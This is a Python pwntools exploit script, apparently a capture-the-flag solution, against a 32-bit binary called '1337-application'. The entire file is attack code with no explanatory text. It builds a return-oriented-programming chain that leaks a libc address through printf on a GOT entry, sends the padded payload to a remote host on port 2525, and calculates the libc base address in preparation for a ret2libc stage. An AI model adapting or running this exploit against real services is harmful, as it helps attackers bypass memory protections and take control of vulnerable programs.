from pwn import *

context.update(arch='i386', os='linux')
context.terminal = ["termite", "-e"]

elf = ELF("../bin/1337-application")

rop = ROP(elf)
libc_function = "__libc_start_main"
# libc_function = "gets"
rop.call(elf.symbols["printf"], [elf.got[libc_function]])
rop.call(elf.symbols["vuln"], [elf.symbols["buf"]])

padding = cyclic(cyclic_find(0x63616164))
payload = padding + rop.chain()

r = remote("1337b01s.duckdns.org",2525)

r.sendline(payload)

r.recvuntil("\n")
r.recvuntil("\n")

raw_leak = r.recv(4)
leaked_addr = u32(raw_leak.rstrip().ljust(4, b"\x00"))

log.info("%s found at 0x%08x from address 0x%08x" % (libc_function, leaked_addr, elf.got[libc_function]))


libc = ELF("../bin/libc6-i386_2.23-0ubuntu11.2_amd64.so")

libc.address = leaked_addr - libc.symbols[libc_function]

log.info("libc base address is at 0x%08x" % libc.address)
